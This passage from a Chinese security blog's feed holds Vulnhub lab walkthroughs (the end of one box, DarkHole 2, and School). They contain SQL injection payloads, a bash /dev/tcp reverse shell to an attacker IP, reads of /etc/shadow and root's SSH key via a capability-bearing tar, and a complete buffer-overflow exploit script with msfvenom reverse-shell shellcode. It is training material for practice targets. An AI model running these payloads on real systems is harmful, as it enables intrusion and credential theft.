<p>如果直接在后面输入index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_vh95pitq4hv51ijj1b6g83o8afetposj则可以反弹；但是如果把域名都加进去则不行，此时需要重新登录刷新一下session，然后再次执行sql语句，接着包含session文件。</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506223218.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>查看/etc/passwd <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:998:User <span class="keyword">for</span> polkitd:/:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br><span class="line">admin:x:1000:1000::/home/admin:/bin/bash</span><br><span class="line">mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin</span><br></pre></td></tr></table></figure></p>
<p>看到了admin，想到刚刚还破解了密码，但无法ssh登录，尝试直接切换用户</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506223922.png" /></p>
<p>利用python将shell简单升级下。</p>
<p>接下来进行信息收集，利用工具，发现系统内核比较老，因此先后尝试了3.4个内核漏洞，包括脏牛在内的漏洞都无法使用。感觉作者并不想让我们通过内核漏洞提权。</p>
<p>又依次搜索了suid, sudo, crontab,
可疑进程，都没有可以利用的点。又思考了下，想到了之前曾用过依次的capabilities提权，输入如下命令查看：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506224249.png" /></p>
<p>依次查看这些文件的权限，知道查看到/usr/bin/tarS， <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwx------. 1 admin admin 346136 Jun 27  2020 /usr/bin/tarS</span><br></pre></td></tr></table></figure></p>
<p>只有这个是admin可以执行的，因此，我们先切换到家目录（权限最大），然后尝试执行文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506224502.png" /></p>
<p>这好像就是tar命令。我又去搜索了下 cap_dac_read_search+ep
的作用，该权限可以无视DAC权限（简单来说就是我们查看文件权限前面设置的哪些rwx）。</p>
<p><strong>换句话说，如果我们使用tarS命令，就可以无视任何权限限制，压缩任何文件，并解压</strong>。并且家目录下的notes.txt也应证了这一点
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[admin@votenow ~]$ cat notes.txt</span><br><span class="line">cat notes.txt</span><br><span class="line">Reminders:</span><br><span class="line"></span><br><span class="line">1) Utilise new commands to backup and compress sensitive files</span><br></pre></td></tr></table></figure></p>
<p>首先想到的就是读取/etc/shadow，然后破解root的密码：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. tarS -cvf shadow.tar /etc/shadow</span><br><span class="line">2. tarS -xvf shadow</span><br><span class="line">3. <span class="built_in">cd</span> etc <span class="comment"># 千万别 + /</span></span><br><span class="line">4. chmod 700 shadow</span><br><span class="line">5. cat shadow</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506225201.png" /></p>
<p>不说这个root密码用john爆破得不到结果。</p>
<p>接着又思考了一下，想到了ssh只允许公钥认证登录，因此只要我们有/root/.ssh/id_rsa就可以登录。（并不知道是否存在，只是尝试）
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. <span class="built_in">cd</span> ~</span><br><span class="line">2. tarS -cvf s.tar /root/.ssh/id_rsa</span><br><span class="line">3. tarS -xvf s.tar</span><br><span class="line">4. <span class="built_in">cd</span> root/.ssh</span><br><span class="line">5. chmod 600 id_rsa</span><br><span class="line">6. ssh root@<span class="built_in">local</span> -i id_rsa -p 2082</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506225636.png" /></p>
<p>最后，读取2个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /home/admin/user.txt</span><br><span class="line">663ba6a402a57536772c6118e8181570</span><br><span class="line"></span><br><span class="line">2. /root/root-final-flag.txt</span><br><span class="line">Congratulations on getting root.</span><br><span class="line"></span><br><span class="line"> _._     _,-&#x27;&quot;&quot;`-._</span><br><span class="line">(,-.`._,&#x27;(       |\`-/|</span><br><span class="line">    `-.-&#x27; \ )-`( , o o)</span><br><span class="line">          `-    \`_`&quot;&#x27;-</span><br><span class="line"></span><br><span class="line">This CTF was created by bootlesshacker - https://security.caerdydd.wales</span><br><span class="line"></span><br><span class="line">Please visit my blog and provide feedback - I will be glad to hear from you.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>通过该靶机的渗透，我总结了提权的时候查看的顺序：</p>
<ol type="1">
<li>/etc/passwd -&gt; 看用户</li>
<li>uname -a -&gt; 看内核、版本</li>
<li>sudo -l</li>
<li>suid</li>
<li>查看.bash_history</li>
<li>查看进程、端口</li>
<li>capabilities</li>
<li>其他</li>
</ol>
<p>个人意见！！！</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>phpmyadmin漏洞</tag>
        <tag>capabilities提权</tag>
      </tags>
  </entry>
  <entry>
    <title>25 Vulnhub Dark_Hole_2 Writeup</title>
    <url>/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/</url>
    <content><![CDATA[<p>该靶机作者给出的难度是高，但我认为达不到高难度。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/darkhole-2,740/">DarkHole: 2
~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>高（个人感觉达不到高难度）</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li><strong>.git库泄露</strong></li>
<li>源码分析</li>
<li>sql注入</li>
<li><strong>本地端口转发</strong></li>
<li>密码爆破</li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.22</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.22</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507113549.png" /></p>
<p>注意http服务上存在/.git/，以为着80端口可能有<strong>.git库泄露</strong></p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>直接访问80端口，页面上只有一个功能点，那就是login，但是现在还不知道邮箱和密码。</p>
<p>将.git库下载到本地，直接使用wget，我利用githack得不到log消息。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -r http://192.168.100.22/.git/ <span class="comment"># r 递归下载</span></span><br></pre></td></tr></table></figure></p>
<p>得到以IP命名的文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> 192.168.100.22</span><br><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507114533.png" /></p>
<p>因此，将版本会退回a4d9....，然后查看login.php <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10</span><br><span class="line">cat login.php</span><br></pre></td></tr></table></figure></p>
<p>从中找到了邮箱和密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email: lush@admin.com</span><br><span class="line">password: 321</span><br></pre></td></tr></table></figure></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>然后回到登陆界面登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507114821.png" /></p>
<p>注意到url中有一个id=1，先测试是否存在sql注入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; # 白屏</span><br><span class="line">?id=1&#x27;--+ # 正常</span><br></pre></td></tr></table></figure></p>
<p>因此存在SQL注入的漏洞，接下来就是常规的联合注入的过程。有一点不同的是，<strong>之前在判断字段数的时候，order
by后面的数字和字段数不同都会错误，只有相同才不会出错。而该靶机当数字&lt;=字段数的时候不出错，数字&gt;字段数的时候出错</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 6--+</span></span><br><span class="line"><span class="string">2. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="comment">--+</span></span><br><span class="line"><span class="number">3.</span> ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,user(),version(),4,@@basedir,database()--+</span></span><br><span class="line"><span class="string">4. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="comment">--+</span></span><br><span class="line"><span class="number">5.</span> ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>ssh<span class="string">&#x27;),3,4,5,6--+</span></span><br><span class="line"><span class="string">6. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,id,<span class="keyword">user</span>,<span class="number">4</span>,pass,<span class="number">6</span> <span class="keyword">from</span> ssh<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>该数据库下还有其他信息，我都收集了，但是有用的就是ssh的账号和密码：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: jehad</span><br><span class="line">password: fool</span><br></pre></td></tr></table></figure></p>
<p>直接ssh远程连接： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh jehad@192.168.100.22</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507115951.png" /></p>
<h2 id="水平移动">2.4. 水平移动</h2>
<p>首先查看用户： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jehad@darkhole:~$ cat /etc/passwd|grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">lama:x:1000:1000:darkhole:/home/lama:/bin/bash</span><br><span class="line">jehad:x:1001:1001:,,,:/home/jehad:/bin/bash</span><br><span class="line">losy:x:1002:1002:,,,:/home/losy:/bin/bash</span><br></pre></td></tr></table></figure></p>
<h3 id="losy">2.4.1. losy</h3>
<p>进行了必要的收集之后，在/home/jehad/.bash_history中发现了重要的信息（节选）
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> losy</span><br><span class="line">cat authorized_keys</span><br><span class="line">cat id_rsa</span><br><span class="line">cat id_rsa.pub </span><br><span class="line">cat authorized_keys </span><br><span class="line">touch authorized_kyes</span><br><span class="line">ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129</span><br><span class="line">curl <span class="string">&quot;http://localhost:9999/?cmd=id&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>原本以为losy可以利用公钥认证登录，但是被删除了。又注意到9999端口下可能存在着命令执行，因此查看该端口上执行的进程</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507120439.png" /></p>
<p>/opt/web目录下有一个index.php，内容如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Parameter GET[&#x27;cmd&#x27;]&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>很显然存在命令执行，于是我先尝试了/home/jehad/.bash_history里面的反弹shell的命令，但是行不通，于是使用如下命令：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.100.10/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>将其进行url编码</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507121853.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://127.0.0.1:9999/?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27          </span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507121921.png" /></p>
<h3 id="lama">2.4.2. lama</h3>
<p>直接使用MidPwds.txt字典爆破即可</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507122828.png" /></p>
<h2 id="权限提升">2.5. 权限提升</h2>
<p>如果之前权限为losy，那么还是先检查/home/losy/.bash_history，注意到：</p>
<ol type="1">
<li>有一个密码 gang</li>
<li>sudo -l</li>
<li>以及python反弹shell的命令</li>
</ol>
<p>直接执行sudo -l，失败了，尝试ssh登录losy，密码为gang，成功！接着sudo
-l</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123135.png" /></p>
<p>接下来就很简单了： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123229.png" /></p>
<p>如果之前得到lama的权限，就更简单了。同样查看sudo -l</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123307.png" /></p>
<p>直接切换成root即可 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123338.png" /></p>
<p>最后，读取两个flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /home/losy/user.txt</span><br><span class="line">DarkHole&#123;&#x27;This_is_the_life_man_better_than_a_cruise&#x27;&#125;</span><br><span class="line"></span><br><span class="line">2. /root/root.txt</span><br><span class="line">DarkHole&#123;&#x27;Legend&#x27;&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="番外">3. 番外</h1>
<p>其实在get
shell的时候除了使用curl，还可以使用ssh，/home/jehad/.bash_history里面也涉及到了：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L &lt;localport&gt;:&lt;remotethost&gt;:&lt;remotepost&gt; &lt;hostname@ip&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>本地转发</strong>：作用就是将本机的某个端口映射到远程主机的端口。这样远程主机就能通过对应的端口访问本机端口上的服务。</p>
<p>因此，该靶机中可以如此： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali: ssh -L 9999:localhost:9999 jehad@192.168.100.22</span><br></pre></td></tr></table></figure></p>
<p>解释：对于靶机来说，kali就是远程主机。因为是在kali上运行该命令，于是remotethost
= localhost。这样子，就能够在kali的9990端口上访问靶机的9999端口。</p>
<p>然后浏览器访问: 127.0.0.1:9999</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507133252.png" /></p>
<p>直接输入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27   </span><br></pre></td></tr></table></figure></p>
<p>即可反弹shell。</p>
<h1 id="总结">4. 总结</h1>
<p>对该靶机的渗透，有以下新的知识点：</p>
<ol type="1">
<li>.git 泄露</li>
<li>利用ssh进行本地端口转发</li>
<li>.bash_history一定要看！</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>本地端口转发</tag>
        <tag>.git库泄露</tag>
        <tag>.bash_history</tag>
      </tags>
  </entry>
  <entry>
    <title>26 Vulnhub School Writeup</title>
    <url>/2022/05/07/26%20Vulnhub%20School%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，不过搭建Windows环境确实挺恶心的。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/school-1,613/">School: 1 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>高</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>SQL注入</li>
<li>信息泄露</li>
<li>文件上传</li>
<li>密码破解</li>
<li>WINE</li>
<li>缓冲区溢出</li>
<li>EXP代码编写</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.30</span><br><span class="line">sudo nmap -p22,23,80 -A 10.0.2.30</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507182321.png" /></p>
<p>信息很常规，多了一个23端口，尝试用nc连接，但是无论输入什么命令都会直接断开。因此，直接访问80断开</p>
<h2 id="访问http服务-get-shell">2.2. 访问http服务 + get shell</h2>
<p>页面就是一个登录界面，测试发现存在SQL注入，直接万能密码登录。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: -1&#x27;or 1=1-- </span><br><span class="line">password: 随便</span><br></pre></td></tr></table></figure></p>
<p>直接进入后台，并且是administrator用户。查看源码发现一句可疑的注释：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &lt;a href=&quot;index.php?page=site_settings&quot; class=&quot;nav-item nav-site_settings&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接访问，发现存在文件上传的功能点，测试了一下，可以上传php文件。但是，上传成功之后不知道路径，因此接下来进行路径扫描
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.30/student_attendance</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507183111.png" /></p>
<p>在 assets
目录下存在upload的目录，在里面找到刚刚上传的php文件，不过名字被改了。</p>
<p>直接上传 /usr/share/webshells/php/php-reverse-shell.php
文件，然后访问即可反弹shell（需要修改ip和端口）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507183416.png" /></p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>我查看了所有常用的权限提升的办法，都没有用，最后在/root目录下发现了一个
win 文件和一个 .wine 目录。win文件的内容如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">  wine /opt/access/access.exe</span><br><span class="line">  sleep 3</span><br><span class="line"> <span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>查看/opt/access目录下除了存在access.exe之后，还有一个funcs_access.dll。这两个都是典型的Windows下的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507183731.png" /></p>
<p>并且 access.exe
是root权限运行的。除此之外，没有任何可以使用的信息，虽然存在mysql，但是运行权限太低，没有作用。</p>
<p>接下来就是wine缓冲区溢出漏洞。先将这两个文件都上传到Windows主机上。然后需要两个工具：</p>
<ol type="1">
<li>immunity debugger</li>
<li>mona.py</li>
</ol>
<p>使用immunity debugger打开access.exe，并且运行</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507184611.png" /></p>
<p>kali编写如下代码，通过不断修改，确定字符的位置 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2000</span></span><br><span class="line">	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&quot;10.0.2.31&quot;</span>, <span class="number">23</span>)) <span class="comment"># 启动access.exe的主机</span></span><br><span class="line">	s.send(buffer)</span><br><span class="line">	s.close()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;\nDone&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Error&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>查看Windows进程可以发现，当启动access.exe的时候，23端口被打开，因此推测该程序将会监听23端口。靶机上也是如此。</p>
<p>这里其实就是在Windows上做了以下几步：</p>
<ol type="1">
<li>查看是否存在缓冲区溢出漏洞</li>
<li>找字符位置</li>
<li>找jump esp（利用mona.py，这里需要注意找那些都是false的模块）</li>
<li>测坏字符。不同环境下能够运行的字符都不同，</li>
</ol>
<p>不想演示了，Windows操作太烂了</p>
<p>直接给出poc.py: <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">buf=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">target_ip=<span class="string">&#x27;10.0.2.30&#x27;</span></span><br><span class="line">target_port=<span class="number">23</span></span><br><span class="line">recv_buf=<span class="number">4096</span></span><br><span class="line">junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">1902</span></span><br><span class="line">ret_addr=<span class="string">b&#x27;\xd0\x12\x50\x62&#x27;</span></span><br><span class="line">nops=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">32</span>  <span class="comment">#  可选</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x76\x0e\xf7\xf1\xce\x10\x83\xee\xfc\xe2\xf4\x0b\x19&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4c\x10\xf7\xf1\xae\x99\x12\xc0\x0e\x74\x7c\xa1\xfe&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x9b\xa5\xfd\x45\x42\xe3\x7a\xbc\x38\xf8\x46\x84\x36&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc6\x0e\x62\x2c\x96\x8d\xcc\x3c\xd7\x30\x01\x1d\xf6&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x36\x2c\xe2\xa5\xa6\x45\x42\xe7\x7a\x84\x2c\x7c\xbd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xdf\x68\x14\xb9\xcf\xc1\xa6\x7a\x97\x30\xf6\x22\x45&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x59\xef\x12\xf4\x59\x7c\xc5\x45\x11\x21\xc0\x31\xbc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x36\x3e\xc3\x11\x30\xc9\x2e\x65\x01\xf2\xb3\xe8\xcc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8c\xea\x65\x13\xa9\x45\x48\xd3\xf0\x1d\x76\x7c\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\x9b\xaf\xed\xcf\xc3\x7c\xf5\x45\x11\x27\x78\x8a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\xd3\xaa\x95\x71\xae\xab\x9f\xef\x17\xae\x91\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7c\xe3\x25\x9d\xaa\x99\xfd\x22\xf7\xf1\xa6\x67\x84&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc3\x91\x44\x9f\xbd\xb9\x36\xf0\x0e\x1b\xa8\x67\xf0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xce\x10\xde\x35\x9a\x40\x9f\xd8\x4e\x7b\xf7\x0e\x1b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x40\xa7\xa1\x9e\x50\xa7\xb1\x9e\x78\x1d\xfe\x11\xf0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x08\x24\x59\x7a\xf2\x99\xc4\x10\xf5\xea\xa6\x12\xf7&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe4\x7d\x99\x11\x9b\xde\x46\xa0\x99\x57\xb5\x83\x90&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x31\xc5\x72\x31\xba\x1c\x08\xbf\xc6\x65\x1b\x99\x3e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa5\x55\xa7\x31\xc5\x9f\x92\xa3\x74\xf7\x78\x2d\x47&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa0\xa6\xff\xe6\x9d\xe3\x97\x46\x15\x0c\xa8\xd7\xb3&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd5\xf2\x11\xf6\x7c\x8a\x34\xe7\x37\xce\x54\xa3\xa1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x98\x46\xa1\xb7\x98\x5e\xa1\xa7\x9d\x46\x9f\x88\x02&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x2f\x71\x0e\x1b\x99\x17\xbf\x98\x56\x08\xc1\xa6\x18&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x70\xec\xae\xef\x22\x4a\x3e\xa5\x55\xa7\xa6\xb6\x62&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4c\x53\xef\x22\xcd\xc8\x6c\xfd\x71\x35\xf0\x82\xf4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x75\x57\xe4\x83\xa1\x7a\xf7\xa2\x31\xc5&quot;</span>    </span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += junk</span><br><span class="line">payload += ret_addr</span><br><span class="line">payload += nops</span><br><span class="line">payload += buf</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET,socket.SOCK_STREAM) <span class="keyword">as</span> clientSock:</span><br><span class="line">    clientSock.connect((target_ip,target_port))</span><br><span class="line">    data_from_srv = clientSock.recv(recv_buf)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Reply --&gt; <span class="subst">&#123;data_from_srv&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Sending --&gt; <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    clientSock.sendall(payload)</span><br></pre></td></tr></table></figure></p>
<p>中间一大串shellcode通过下面命令生成 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.27 LPORT=5555 -b <span class="string">&#x27;\x00\x0a\x4d\x4f\x5f\x79\x7e\x7f&#x27;</span> -f python</span><br></pre></td></tr></table></figure></p>
<p>-b 后面跟的是坏字符</p>
<p><img
